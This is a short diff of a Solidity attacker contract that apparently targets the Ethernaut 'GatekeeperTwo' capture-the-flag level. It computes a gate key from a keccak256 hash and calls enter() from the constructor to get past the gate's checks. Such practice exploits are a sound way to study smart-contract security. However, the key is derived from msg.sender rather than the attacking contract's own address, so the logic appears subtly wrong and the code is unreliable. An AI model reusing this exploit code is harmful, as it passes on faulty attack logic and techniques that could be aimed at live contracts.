@@ -39,10 +39,12 @@ contract EnterGate {
     GatekeeperTwo public gatekeeperTwo;
     
     uint64 _gateKey = type(uint64).max;
-    bool public iTrickedIt; 
-    constructor()   {
-        gatekeeperTwo = GatekeeperTwo(0xdCEBeB6B9c0D5a15A6c162EB3fFc44E2DaDA4417);
-        gatekeeperTwo.enter(bytes8(_gateKey));
+     
+    constructor(address _gatekeeperTwo)   {
+        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
+        uint64 result = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max;
+        bytes8 answer = bytes8 (result);
+        gatekeeperTwo.enter(bytes8(answer));
 
     }
 }
